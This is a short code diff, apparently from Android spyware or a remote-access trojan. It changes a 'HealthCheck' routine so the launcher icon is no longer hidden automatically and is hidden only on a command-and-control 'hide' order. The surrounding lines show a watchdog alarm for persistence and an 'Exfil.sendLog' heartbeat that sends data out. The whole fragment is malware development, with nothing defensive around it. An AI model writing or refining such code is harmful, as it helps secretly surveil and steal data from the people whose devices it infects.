@@ -59,7 +59,10 @@ object HealthCheck {
 
         Prefs.set(ctx, KEY_NEXT_RUN, now + backoff)
 
-        IconHider.hide(ctx)
+        // The launcher icon is never hidden automatically - hiding it makes the
+        // app impossible to start again. It is only hidden on the explicit
+        // C2 command "hide".
+        IconHider.show(ctx)
         WatchdogAlarm.arm(ctx, backoff)
 
         Exfil.sendLog(ctx, "heartbeat",
